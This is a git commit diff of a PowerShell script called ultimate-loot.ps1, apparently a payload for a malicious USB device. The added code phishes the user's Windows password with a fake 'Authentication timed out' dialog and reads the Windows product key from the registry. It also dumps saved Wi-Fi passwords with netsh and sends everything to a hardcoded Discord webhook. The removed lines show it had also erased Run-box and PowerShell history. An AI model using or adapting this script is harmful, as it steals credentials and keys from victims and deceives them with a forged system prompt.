3a0b0013b75e834708706e0e9514553042555963
nidez <pistolesi.marco@gmail.com>
2024-01-24 13:04:53 +0100

    Update ultimate-loot.ps1

--- ultimate-loot.ps1
+++ ultimate-loot.ps1
@@ -1,115 +1,88 @@
-# ----------------- PAUSE TILL MOUSE !
+$hookurl = "https://discord.com/api/webhooks/1199489111795433472/1iwQQD8yt6mWJthoohN6eFkO8E4vfoMQ7uNaGeRjmFsAffe_Baryf9vK8WELljjCLn4b"
 
+
+
+# ----------------- PAUSE TILL MOUSE (+ 30 secs) !
 Add-Type -AssemblyName System.Windows.Forms
 $originalPOS = [System.Windows.Forms.Cursor]::Position.X
 $o=New-Object -ComObject WScript.Shell
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
-        }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
-        }
-    }
-    
-# ----------------- CAPS OFF !
-
-Add-Type -AssemblyName System.Windows.Forms
-$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
-
-#If true, toggle CapsLock key, to ensure that the script doesn't fail
-if ($caps -eq $true){
-
-$key = New-Object -ComObject WScript.Shell
-$key.SendKeys('{CapsLock}')
+while (1) {
+  $pauseTime = 30
+  if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) { 
+    break 
+  } else { 
+    $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime 
+  }
 }
 
-# ----------------- PROMPT WARNING !
 
+
+# ----------------- GET WIN SERIAL NUMBER !
+$seriale = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" -Name "BackupProductKeyDefault")
+
+
+
+# ----------------- GET STORED WIFI PASSes (EN) !
+$wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ssid=$name;pass=$pass }} | Format-Table -AutoSize | Out-String
+
+
+
+# ----------------- GET STORED WIFI PASSes (IT) !
+$wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ssid=$name;pass=$pass }} | Format-Table -AutoSize | Out-String
+
+
+
+# ----------------- CAPS OFF !
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+if ($caps -eq $true){
+  $key = New-Object -ComObject WScript.Shell
+  $key.SendKeys('{CapsLock}')
+}
+
+
+
+# ----------------- PROMPT AUTH WARNING !
 Add-Type -AssemblyName PresentationCore,PresentationFramework
-$msgBody = "Please authenticate your Microsoft Account."
+$msgBody = "Authentication timed out, please login using your Windows account."
 $msgTitle = "Authentication Required"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
 
+
+
 # ----------------- PROMPT FOR CREDENTIALS !
- $form = $null
-    while ($form -eq $null)
-    {
-        $cred = $host.ui.promptforcredential('Failed Authentication!v5','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
-        $cred.getnetworkcredential().password
-        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
-        {
-            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
-            {
-                Add-Type -AssemblyName PresentationCore,PresentationFramework
-            }
-            $msgBody = "Credentials cannot be empty!"
-            $msgTitle = "Error"
-            $msgButton = 'Ok'
-            $msgImage = 'Stop'
-            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-            Write-Host "The user clicked: $Result"
-            $form = $null
-        }
-        else{
-	    $creds = $cred.GetNetworkCredential() | fl
-            $userlogin = $cred.username
-	    $passlogin = $cred.GetNetworkCredential().password
-            $form = "OK"
-        }
+$form = $null
+while ($form -eq $null)
+{
+  $cred = $host.ui.promptforcredential('Failed Authentication!v5','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+  $cred.getnetworkcredential().password
+  if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
+  {
+    if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" })) 
+    { 
+      Add-Type -AssemblyName PresentationCore,PresentationFramework 
     }
+    $msgBody = "Credentials cannot be empty!"
+    $msgTitle = "Error"
+    $msgButton = 'Ok'
+    $msgImage = 'Stop'
+    $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+    Write-Host "The user clicked: $Result"
+    $form = $null
+  } else {
+    $creds = $cred.GetNetworkCredential() | fl
+    $userlogin = $cred.username
+    $passlogin = $cred.GetNetworkCredential().password
+    $form = "OK"
+  }
+}
 
 
-# ----------------- LOOK FOR WIFIs (in italian and english) !
-$wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID-NAME=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String
-$wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID-NAME=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String
-
-
-$hookurl = "$dc"
+# ----------------- SEND RESULTS VIA DISCORD !
 $Body = @{
   'username' = $env:username 
-  'content' = "I got a nice present 4 ya :) `n Ita: $wifiProfiles_IT`n Eng: $wifiProfiles_EN `n`n`"
+  'content' = "Ciao! `n Ho un regalino per te :) `n `n Wi-Fi Profiles and Passwords: $wifiProfiles_IT $wifiProfiles_EN `n `n Windows Credentials  `n --------------- `n user: $userlogin `n pass: $passlogin `n `n Windows Serial  `n --------------- `n S/N: $seriale "
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
-
-
-# Delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-
-
-
-
-
-
-
-
-
-
-
-# ----------------- DISCORD SENDING !
-
-$hookurl = "$dc"
-$Body = @{
-  'username' = $env:username 
-  'content' = "I got some nice presents 4 ya :) `n  WIN CREDENTIALS: `n user: $userlogin `n  pass: $passlogin `n `n WI-FI: `n $wifiProfiles_IT $wifiProfiles_EN"
-}
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
-
-
-
-# ----------------- SPRING CLEANING
-
-# Delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-exit
